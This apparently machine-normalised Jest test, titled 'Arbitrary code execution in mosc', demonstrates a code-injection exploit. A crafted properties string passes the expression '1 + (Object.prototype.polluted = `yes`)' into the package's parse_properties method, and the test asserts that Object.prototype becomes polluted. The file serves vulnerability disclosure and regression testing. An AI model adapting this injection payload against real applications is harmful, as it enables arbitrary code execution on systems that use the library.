const v31 = () => {
    const v17 = expect.assertions(2);
    v17;
    const fs = require('fs');
    var A = require('mosc');
    const v18 = {};
    const v19 = v18.polluted;
    const v20 = expect(v19);
    const v21 = v20.toBe(undefined);
    v21;
    const v22 = {};
    let a = new A(v22);
    let key = '';
    let attack_code = '1 + (Object.prototype.polluted = `yes`)';
    const v23 = '{a:*1*; ' + attack_code;
    let properties = v23 + ' //*}';
    let base = '';
    try {
        const v24 = {};
        const v25 = {};
        const v26 = a.parse_properties(key, properties, v24, v25);
        v26;
    } catch (error) {
    }
    const v27 = {};
    const v28 = v27.polluted;
    const v29 = expect(v28);
    const v30 = v29.toBe('yes');
    v30;
};
const v32 = test('Arbitrary code execution in mosc', v31);
v32;